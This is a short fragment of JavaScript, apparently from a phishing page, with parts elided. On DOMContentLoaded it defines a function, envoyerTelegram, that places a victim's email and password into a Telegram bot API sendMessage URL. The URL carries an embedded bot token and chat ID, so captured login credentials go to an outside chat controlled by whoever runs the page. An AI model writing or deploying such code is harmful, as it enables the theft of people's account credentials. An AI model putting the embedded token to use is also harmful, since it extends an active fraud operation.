document.addEventListener('DOMContentLoaded', function () {
    ...
    function envoyerTelegram(data) {
        ...
        const telegramBot1Url = `https://api.telegram.org/8107688809:AAGVUC_P6uiK6MYqXIZJvNjzg77LKrqpsms/sendMessage?chat_id=8356596920&text=🟧- ${data.email}:${data.password}`;
